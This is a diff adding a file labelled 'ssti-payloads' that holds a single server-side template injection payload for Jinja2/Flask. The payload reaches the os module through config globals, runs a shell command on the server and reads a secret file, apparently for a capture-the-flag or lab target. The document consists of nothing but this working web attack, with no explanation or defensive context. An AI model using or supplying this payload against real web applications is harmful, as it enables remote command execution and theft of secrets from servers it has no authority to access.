@@ -1,0 +1,5 @@
+
+ssti-payloads:
+
+{{config.__class__.__init__.__globals__['os'].popen('cat 142awdfasd_secret.txt').read()}}
+
